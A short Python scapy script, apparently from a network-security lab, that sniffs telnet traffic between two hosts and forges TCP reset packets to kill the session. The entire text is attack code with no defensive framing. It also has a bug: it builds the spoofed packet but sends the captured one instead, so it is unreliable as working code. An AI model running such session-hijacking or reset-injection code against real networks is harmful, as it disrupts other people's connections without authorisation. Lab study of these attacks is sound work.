#!/usr/bin/python
from scapy.all import *
import sys

IP_SRC = '10.0.2.12'
IP_DST = '10.0.2.8'

def spoof_pkt(pkt):
    old_tcp = pkt[TCP]
    ip = IP(src = IP_SRC, dst = IP_DST)
    tcp = TCP(sport = 23, dport = old_tcp.sport,
     flags = 'R', seq = old_tcp.ack)
    new_pkt = ip/tcp
    ls(new_pkt)
    send(pkt, verbose = 0)

f = 'tcp and src host 10.0.2.12 and dst host 10.0.2.8 and dst port 23' 
sniff(filter = f, prn = spoof_pkt)




